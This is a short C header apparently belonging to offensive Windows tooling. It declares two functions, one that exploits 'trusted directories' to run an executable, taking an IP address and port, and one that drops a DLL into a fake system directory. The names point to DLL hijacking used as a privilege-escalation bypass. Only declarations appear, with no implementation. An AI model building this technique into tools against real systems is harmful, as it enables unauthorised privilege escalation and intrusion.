#pragma once

#ifndef DLL_HIJACKING_HEADER_H
#define DLL_HIJACKING_HEADER_H

BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* UipAddress, char* port);
BOOL DropDllFile(Kernel32_API kernel32, Cabinet_API cabinetAPI, char* fakeSystemDir, char* fileName);

#endif